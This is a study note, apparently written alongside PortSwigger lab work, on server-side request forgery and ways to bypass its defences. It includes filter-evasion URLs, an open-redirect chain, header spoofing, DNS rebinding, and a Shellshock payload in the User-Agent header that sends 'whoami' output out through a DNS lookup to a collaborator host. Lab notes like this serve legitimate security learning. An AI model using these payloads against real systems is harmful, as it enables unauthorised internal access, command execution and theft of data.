When an adversary causes a **server to make requests to unintended internal/external systems**, often exploiting existing trust relationships between them. Such requests could include:
- Other internal servers/resources
- An attacker-controlled server


### SSRF against the application server
Coercing a web application to **make a `HTTP` request back to the server hosting it**, often via **specifying a loopback interface (`127.0.0.1`, `localhost`) in the URL/HTTP request body.**

Often used when the **front-end application has to query various backend (REST) APIs** to retrieve data, like product stock etc.
E.g.:
``` HTTP
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
... becomes
stockApi=http://localhost/admin
```

Importantly, it allows adversaries to **inherit the privileges of the server making the request,** and occasionally bypass access control checks or use breakglass/emergency back channels.

#### Why does this "inherent trust" of the local machine happen?
- Access control check **only implemented on/affects the front-end server** or application
- **For disaster recovery purposes** - assumes only a fully trusted user would come directly from the server
- Admin interface may listen on a **different port only accessible to the main application/server**, but not front-end users.

## SSRF against other backend systems:
If there are other back-end systems that are not directly reachable by users, SSRF can be used to coerce the web app server into contacting them:
``` HTTP
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```
- Tip: use **intruder** to enumerate requests to back-end networks, like:
![](attachments/Pasted%20image%2020251101202141.png)

## Common SSRF Defences

### Blacklist-based input filters
Some defences filter for known targeted URLs/IPs, like `localhost`, `127.0.0.1`, or sensitive endpoints like `/admin`.
- **Use alternative representations of `127.0.0.1`**: `2130706433`, `017700000001`, or `127.1`.
- **Register your own domain name resolving to `127.0.0.1`** - can use `spoofed.burpcollaborator.net` to do this
- **Classic URL/endpoint obfuscation techniques**: URL-encoding, case variation ( #tool-potential)
- Provide a **controlled URL redirecting to the target**, and use **different redirect codes & protocols** (e.g. switching from `https://` to `http://`)

Some bypasses can be [found here (Hacktricks)](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html).

#### [Lab](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter): SSRF with blacklist-based input filter
- Tried contacting localhost (`stockApi=http://127.0.0.1`) --> `"External stock check blocked for security reasons"`. Indicates a filter in place, potentially whitelisting.
- Tried **encoding** --> ![](attachments/Pasted%20image%2020260415124326.png)
  Is a fairly chatty error response, so could work with this.
- Trying other encoding techniques, with [Burp-Encode-IP extension](https://github.com/e1abrador/Burp-Encode-IP) (BAPP), find out that `http://127.1` reveals the new `Admin Panel` with an endpoint `href="/admin"` on the rendered page, indicating this is likely accessible via loopback only.
- Trying `http://127.1/admin` hits another security reasons block. Now, **try encoding/case-varying `admin`** --> ![](attachments/SSRF%20(Server%20Side%20Request%20Forgery).png)
- From here, found the request to delete a given user, and sent the altered version to complete the lab: `stockApi=http://172.1/aDmIn/delete?username=carlos`
  ![](attachments/SSRF%20(Server%20Side%20Request%20Forgery)-1.png)

---

### Whitelist-based input filters
#double-encoding #ssrf-whitelist #url-validation-bypass 
Some applications only allow inputs that match, a whitelist of permitted values - may **validate either parts of** or **the entire URL**, or **specific values within it**. 
Can occasionally bypass with **inconsistencies in URL-parsing**, such as:
- **Embedding credentials in the URL** before the hostname with `@`: `https://expected-host:fakepassword@evil-host` (in form `username:password@example.com`)


`https://expected-host:fakepassword@evil-host` (in form `username:password@example.com`

https%3A%2F%2Fwww.canon.com.au:yay@ds9s1knamoh8gaknctkonthc93fu3pre.c.ccxsta.com%2Fauth%2Faccount%2Fsignin


- **Inject known-good values with URL fragments** `#`: `https://evil-host#expected-host`
- Place whitelisted inputs into a FQ DNS name, like `https://expected-host.evil-host`
- **URL-encode characters (or [double-encoding](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding)** - *as some servers perform two rounds of URL decoding on any URLs they receive, and not all filters will do this, so can exploit discrepancies*) to confuse parsers, especially if the filter handles URL-encoded characters differently from the code performing the back-end HTTP request.
- **Combos of techniques!**

#### [Lab](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter): SSRF with whitelist-based input filter

Error message reveals known-good value: host must be `stock.weliketoshop.net`, and the original request is in the form `http://stock.weliketoshop.net:8080`, URL-encoded, with the parameters `?productId=X&storeId=X`

So know that: `http%3a//stock.weliketoshop.net%3a8080/%3fproductId%3d4%26storeId%3d1` --> `http://stock.weliketoshop.net:8080/?productId=4&storeId=1`. 
Appears to **parse URL, extract hostname, and validate against whitelist.**
![](attachments/SSRF%20(Server%20Side%20Request%20Forgery)-2.png)
Changing it to contain embedded credentials with `username@site.com` seems to be accepted, although throws error as is not a valid endpoint: `stockApi=http://username@stock.weliketoshop.net`.
![](attachments/Pasted%20image%2020260415181943.png)

However, appending a URL fragment to the `username#@` is rejected with `External stock check host must be stock.weliketoshop.net`.
- This suggests that the URL parser is **treating everything after the protocol (`http://`) as the URL**, ***until*** it reaches a `#`, whereupon **everything after `#` is treated as a URL fragment** (i.e. a reference on a page, e.g. to a header). This is why the validation checker no longer sees the `stock.weliketoshop.net` after and rejects the request based on that being the whitelisted value.
- But the server is now trying to connect to `http://username`, so we can try and exploit this by **encoding the `#` to satisfy the filter but connect to whatever comes before the `#`**
![](attachments/SSRF%20(Server%20Side%20Request%20Forgery)-3.png)
*Single* URL-encoding gets the same error - `"External stock check host must be stock.weliketoshop.net"`
**Double-URL-encoding it** seems to let it pass! While it throws an internal server error, this indicates that the app **may be trying to connect to `http://username`,** and viewing **everything after the `#`** as an **element in the application**, and then everything after the `/` as the path to the page in the app.
![](attachments/Pasted%20image%2020260415182824.png)
So the internal lookup for **`http://localhost`**`%2523@stock.weliketoshop.net`**`/admin`** goes to **`http://localhost/admin`**`#@stock.weliketoshop.net`, whilst satisfying the filter!
![](attachments/Pasted%20image%2020260415183308.png)
Now we can delete carlos! `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos`

### Bypassing filters via open redirection
If the app is vulnerable to an open redirect vulnerability - like `https://site.com/product/?currentProductId=6`**`&path=http://evil-user.net`**, provided the **API used to make the back-end HTTP request supports redirections**, you can construct a URL that satisfies the SSRF filter and **results in a redirected request to the desired back-end target**.
``` http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

#### [Lab](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): SSRF with filter bypass via open redirection vulnerability

Notice the stockcheck uses a relative path, i.e. `stockApi=/product/stock/check?productId=5&storeId=1`. So can't provide just localhost or a local IP:
![](attachments/Pasted%20image%2020260415184917.png)


However, noticing some requests use the `&path=` parameter, testing for open redirect uncovers one!
![](attachments/Pasted%20image%2020260415184448.png)
We can use this with the relative path in the stockcheck to perform SSRF if the backend API supports the subsequent redirect triggered by the `&path=XXXX` value.

Supplying `/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin` (URL encoded) gets us to the admin page due to the open redirect, bypassing the filter!
![](attachments/Pasted%20image%2020260415184629.png)

## Blind SSRF
When the server is **induced to make an HTTP request to an arbitrary URL or endpoint**, but the response is **not immediately returned** within the application's front-end response itself. Often appears later in the form of a HTTP/DNS lookup.

*Common to receive DNS lookups, but no subsequent HTTP requests (often due to network filtering). Whilst this is often not exploitable, a DNS callback **confirms the attacker controls a URL parameter that the server processes.** So the initial vulnerability is present; just need to bypass the blocking mechanism to exfiltrate data.* 
- See [here](https://undercodetesting.com/from-blind-pings-to-full-compromise-converting-dns-only-ssrf-into-critical-vulnerabilities-video/) on where DNS-only SSRF pings can be dangerous.

To **bypass #IP-based-SSRF-filters** (resulting in DNS only pingbacks), try and **manipulate headers** like:
- `X-Forwarded-For` *(can contain a list of IPs, and with improper parsing can often bypass SSRF filters)*
- `X-Real-IP`
- `CF-Connecting-IP` 
- `Client-IP` etc.
These are often used to **pass the original client IP through proxies or behind load balancers.** As these can be trusted & allowed through network filters, **inject/spoof your IP using these headers to known-good values** (found throughout the rest of the application).

Also, **try alternative representations of blacklisted values** (url-encoded, decimal/octal representation, etc.)


#### Discovering Blind SSRF
Most commonly discovered by injecting URLs of attacker-controlled endpoints, such as collaborator payloads, into **all potential spots** where **the server may be talking to a backend by invoking a URL/sending a request.**
- `Referer` headers (analytics software)
- Actions/potential backend API queries (e.g. `stockAPI=XXXX` parameter in `POST` request)

#### Exploiting Blind SSRF
Whilst it can't always be used to explore content on systems that the application server can reach, it can be leveraged to **probe for other vulnerabilities** on the **server/other back-end systems**. 
1. **Blindly sweep the internal IP address space** with **payloads designed to detect well-known vulnerabilities**. 
2. Embed blind out-of-band techniques *within the payloads*, so they are **first processed** and *then* **issue a subsequent OOB request**, may uncover a critical vulnerability on an unpatched internal server.

##### [Lab](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation): Blind SSRF with Shellshock exploitation
Discovered the app is vulnerable to SSRF, with DNS pingbacks + an empty HTTP request (via the `Referer` header), like before. **Need to find a way to make this exploitable, as returns no data.**

Can potentially use this to **ping sweep the internal network**, and get a response **if** the machine is vulnerable to a **secondary exploit** that involves pinging back our collaborator client.

One such exploit that's performed via the `User-Agent:` header is **Shellshock**, which involves RCE and thus also allows us to **ping back our collaborator server** with some additional info (like username!) from the victim!

For this, need to use **two headers**. 
1. We know the `Referer` will target the system that the server contacts, so `Referer=Internal-IP` in the form of a Ping Sweep. 
   E.g. `Referer=192.168.0.1`, then `Referer=192.168.0.2`, etc. **Use Intruder for this.**
2. For each machine, we need to **deliver a payload** to test whether it's vulnerable to Shellshock (or something else). For this, we can inject the **Shellshock payload** into the `User-Agent` header. This could allow RCE on the host, which in this case (as we want to test if they are vulnerable) includes issuing a DNS lookup to our collaborator server and **importantly, appending some information (username, password etc.) to it**, to smuggle it out.

As we've been given a hint about exploiting Shellshock *(but could be any other RCE bug - scan using a wordlist)*, upon researching what it is:
> Shellshock is effectively a Remote Command Execution (RCE) vulnerability in `BASH`. The vulnerability relies in the fact that `BASH` **incorrectly executes trailing commands** when it **imports a function definition stored into an environment variable**. (From [OWASP Shellshock Vulnerability PDF](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf))
![](attachments/Screenshot%202026-04-17%20at%2012.59.36%20am.png)

The following payload is constructed to issue a DNS lookup to our collaborator server, using the shellshock structure above: **function definition** `() { :; };` + **injected OS command** `/usr/bin/nslookup $(whoami).collaborator-domain.oastify.com/

To send this across their entire internal network, guessing based on recon & naming conventions (and the hint given) to be `192.168.0.X:8080`:
![](attachments/6863.png)
Get a DNS lookup from one of them, indicating it's **vulnerable to Shellshock** and we've got RCE on it, with the username **`peter-Ze5m3e`** appended to the domain name lookup!
![](attachments/Screenshot%202026-04-17%20at%201.10.57%20am.png)

**Resources:**
- [Shellshock explanation & exploitation examples](https://github.com/DrHaitham/CVE-2014-6271-Shellshock-?tab=readme-ov-file#3-understanding-the-shellshock-vulnerability) (`curl`, burp, reverse shells, etc.)
- [Lab walkthrough & commentary](https://www.youtube.com/watch?v=k84FLMFtuE4)

Can also try and induce the application to **connect to a system under the attacker's control**, and **return malicious responses to the HTTP client** making the connection. If you can exploit a serious client-side vulnerability in the server's HTTP implementation, you might be able to achieve remote code execution within the application infrastructure.

### ==Finding hidden attack surface for SSRF vulnerabilities==


#### DNS rebinding
#dns-rebinding #dns-ssrf
An attack conducted by **controlling a DNS server** that **holds two IP addresses for a single domain** with a **low (~1sec) #TTL** *(AKA: how long, in seconds, caching servers should store the domain information)*. 
This can bypass #SOP, as from the browser's perspective, the **targeted server & the (resolved via DNS) loopback address `127.0.0.1` appear to be the same**, allowing unauthorized access to internal resources (i.e. web pages accessing resources of different origins).

E.g. using `rbndr.us`, you can **link to a well-known/trusted domain:**
- One internal IP `127.0.0.1` (loopback)
- One known-good public IP (`8.8.8.8`)
So both of these will be **resolved into one domain name** to be provided in a back-end lookup. 

The provided `rbndr.us` URL subsequently **resolves randomly to either 8.8.8.8 (Google DNS) or 127.0.0.1 (localhost)**. 
![](attachments/Screenshot%202026-04-17%20at%2012.36.54%20am.png)
Since **DNS records refresh every second with `TTL=1`**, each query quickly expires, thereby **forcing the server to resolve the domain to a different IP**. Consequently, **each request should return two responses**: first, `403 Forbidden`, and *then* a **successful internal server response**.
After a few tries...
![](attachments/SSRF%20(Server%20Side%20Request%20Forgery)-4.png)

More resources on evading SSRF filters & exploiting DNS-only pingbacks:
- https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- https://highon.coffee/blog/ssrf-cheat-sheet/
- [rdndr.us DNS generator](https://lock.cmpxchg8b.com/rebinder.html)
  ![](attachments/95090.png)
